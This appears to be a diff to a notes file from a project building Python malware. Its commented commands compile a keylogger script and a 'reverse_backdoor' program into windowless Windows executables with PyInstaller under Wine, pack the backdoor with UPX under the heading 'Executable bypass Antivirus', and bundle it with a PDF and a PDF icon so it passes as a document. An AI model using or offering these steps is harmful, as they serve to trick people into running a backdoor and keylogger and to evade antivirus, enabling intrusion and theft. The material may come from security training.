@@ -20,3 +20,13 @@
 
 # wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe start_logger.py --onefile --noconsole
 # wine /root/.wine/drive_c/Python27/python.exe -m pip install pynput
+
+## Executable bypass Antivirus
+# git clone https://github.com/upx/upx
+# ./upx /root/PycharmProjects/reverse_backdoor/dist/reverse_backdoor.exe -o compressed_backdoor.exe
+
+## Iconfinder
+# https://www.iconfinder.com
+# https://www.easyicon.net/language.en/covert/
+
+# wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "/root/Downloads/sample.pdf;." --onefile --noconsole reverse_backdoor.py --icon /root/Downloads/pdf.ico reverse_backdoor.py
